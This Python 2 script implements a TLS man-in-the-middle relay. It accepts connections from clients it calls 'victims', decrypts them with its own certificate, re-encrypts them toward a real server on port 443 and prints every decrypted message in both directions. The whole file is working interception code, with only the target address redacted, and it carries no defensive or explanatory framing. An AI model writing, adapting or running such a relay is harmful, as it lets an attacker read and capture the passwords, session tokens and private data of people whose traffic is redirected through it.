import socket, ssl
from threading import Thread
from time import sleep
import select

# server socket
bindsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
bindsocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

# SSL wrapper for server
bindsocket = ssl.wrap_socket(bindsocket,server_side=True,certfile="server.crt",keyfile="server.key")
bindsocket.bind(('0.0.0.0', 9999))
bindsocket.listen(20)


# handle thread class
class handleThread(Thread):
	def __init__(self, newsocket, csocket):
		self.newsocket = newsocket
		self.othersocket = None
		self.csocket = csocket
		self.data_left = None
		self.data = None
		self.flag = None
		super(handleThread, self).__init__()

	def run(self):
		inputs = [self.newsocket, self.csocket]
		while inputs:
			if self.newsocket.pending():
				readable = [self.newsocket]
			elif self.csocket.pending():
				readable = [self.csocket]
			elif self.csocket.pending() and self.newsocket.pending():
				readable = [self.csocket, self.newsocket]
			else:
				readable, writable, exceptional = select.select(inputs, [], [])
			for s in readable:
				try:
					self.data = s.recv(4096)
				except ssl.SSLError as e:
					print "error occurred"
					continue
				if s is self.csocket:
					self.othersocket = self.newsocket 
					self.flag = True
				else:
					self.othersocket = self.csocket
					self.flag = False
				if self.data:
					if self.flag:
						print "------------------------------------------------------------- Receiving from server:) -------------------------------------------------------------"
					else:
						print "------------------------------------------------------------- Receiving from victim:) -------------------------------------------------------------"
					print len(self.data)
					print self.data

					self.othersocket.sendall(self.data)
				else:
					# othersocket.shutdown(socket.SHUT_RDWR)
					inputs.remove(s)

# victim receive class
class victim_receive(Thread):
	def __init__(self, bindsocket):
		self.bindsocket = bindsocket
		self.newsocket = None
		self.csocket = None
		super(victim_receive, self).__init__()

	def run(self):
		while True:
			self.newsocket, fromaddr = self.bindsocket.accept()
			self.newsocket.setblocking(0)
			print "victim address : ",fromaddr

			# server socket
			self.csocket = socket.socket()
			self.csocket = ssl.wrap_socket(self.csocket, ssl_version=ssl.PROTOCOL_TLSv1)
			self.csocket.connect(('XXX.XXX.XXX.XXX',443))
			self.csocket.setblocking(0)

			# handle victim server one time connection thread
			t2 = handleThread(self.newsocket, self.csocket)
			t2.start()


# victim receive thread
t1 = victim_receive(bindsocket)
t1.start()
